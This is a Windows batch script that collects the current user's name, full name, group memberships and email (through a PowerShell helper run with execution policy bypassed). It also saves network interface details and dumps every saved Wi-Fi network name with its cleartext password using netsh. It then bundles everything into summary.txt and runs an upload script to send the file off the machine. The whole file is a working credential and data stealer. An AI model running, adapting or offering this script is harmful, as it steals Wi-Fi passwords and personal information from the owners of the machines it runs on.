@echo off
setlocal enabledelayedexpansion

del summary.txt
del all_wifi_passwords.txt
del all_wifi_passwords.txt.lock
del user_info.txt
del settingsNetwork.txt
del temp_details.txt
del temp_profiles.txt

:: ############ 1. SAVING PERSONAL INFORMATION ############

:: Temp File for Language checking
set temp_lang=temp_lang.txt

:: checking the system language
wmic os get locale > %temp_lang%

:: english
set "full_name_str=Full Name"
set "group_membership_str=Local Group Memberships"
set "global_group_membership_str=Global Group Memberships"

:: setting language to german language if System is in german
findstr /C:"0407" %temp_lang% > nul
if %errorlevel%==0 (
    set "full_name_str=Vollständiger Name"
    set "group_membership_str=Lokale Gruppenmitgliedschaften"
    set "global_group_membership_str=Globale Gruppenmitgliedschaften"
)

:: save User Information
echo User Information > user_info.txt
echo ===================== >> user_info.txt

:: username
echo Username: %USERNAME% >> user_info.txt

:: Full Name
for /f "tokens=2 delims=:" %%i in ('net user %USERNAME% ^| findstr /R /C:"%full_name_str%"') do (
    set "fullname=%%i"
    set "fullname=!fullname:~1!"
    echo Full Name: !fullname! >> user_info.txt
)

:: Saving Group Memberships
echo Group Memberships: >> user_info.txt
net user %USERNAME% | findstr /R /C:"%group_membership_str%" /C:"%global_group_membership_str%" >> user_info.txt

:: Get Email using PowerShell
powershell -ExecutionPolicy Bypass -File .\get_user_email.ps1 -Username "%USERNAME%"

:: Delete Temp File Language
del %temp_lang%

:: ############ 2. SAVING NETWORK INTERFACES ############

ipconfig /all >> settingsNetwork.txt

:: ############ 3. SAVING WLAN SSIDs + PASSWORDs ############

:: temp file for wlan profiles
set temp_profiles=temp_profiles.txt

:: temp file for wlan details
set temp_details=temp_details.txt

:: save wlan profiles into file
netsh wlan show profiles > %temp_profiles%

:: for loop: save details of wlan profile in temp file
(for /f "tokens=1* delims=:" %%i in ('findstr /R /C:"Profil" /C:"Profile" %temp_profiles%') do (
    set "ssid=%%j"
    set "ssid=!ssid:~1!"

    echo SSID: !ssid! >> all_wifi_passwords.txt

    :: safe selected wlan profile details into temp file
    netsh wlan show profile name="!ssid!" key=clear > %temp_details%

    :: extract wlan password of the temp_details file
    for /f "tokens=2 delims=:" %%j in ('findstr /R /C:"Key Content" /C:"Schlüsselinhalt" %temp_details%') do (
        set "password=%%j"
        set "password=!password:~1!"
        echo Password: !password! >> all_wifi_passwords.txt
    )
    echo. >> all_wifi_passwords.txt
)) 9> all_wifi_passwords.txt.lock

:: delete the temp files that have been created
del %temp_profiles%
del %temp_details%

:: ############ CREATING THE SUMMARY FILE ############

:: Create summary.txt File
(
    echo ==========================
    echo PERSONAL INFORMATION
    echo ==========================
	echo.
    type user_info.txt
    echo.
	echo.
	echo.
	echo.
	echo.
    echo ==========================
    echo NETWORK INTERFACES
    echo ==========================
	echo.
    type SettingsNetwork.txt
    echo.
	echo.
	echo.
	echo.
	echo.
    echo ==========================
    echo WLAN SSIDs + PASSWORDs
    echo ==========================
	echo.
    type all_wifi_passwords.txt
) > summary.txt


::############ SENDING THE SUMMARY FILE ############

python upload.py


endlocal
exit /b
